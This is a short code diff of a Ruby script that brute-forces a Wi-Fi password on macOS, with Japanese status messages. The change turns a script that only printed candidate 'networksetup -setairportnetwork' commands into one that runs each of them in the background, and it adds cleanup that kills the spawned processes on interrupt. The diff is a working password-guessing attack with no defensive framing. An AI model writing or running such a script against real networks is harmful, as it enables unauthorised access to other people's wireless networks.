@@ -20,10 +20,15 @@ end
 def brute_force
   network_name = "aaa"
   [iter(a_Z0_9, "", 0)].flatten.each do |password|
-    puts "networksetup -setairportnetwork en0 #{network_name} #{password}"    	
+    cmd = "networksetup -setairportnetwork en0 #{network_name} #{password}"    	
+    puts cmd
+		system "#{cmd} &"
   end
 rescue Interrupt  
-  puts "\n\nお疲れ\n\n\n"
+	puts "\nお片付けするね.....\n"
+  system "pgrep networksetup | xargs kill"
+	sleep 1 
+  puts "\nお疲れ\n\n\n"
 end  
 
 brute_force
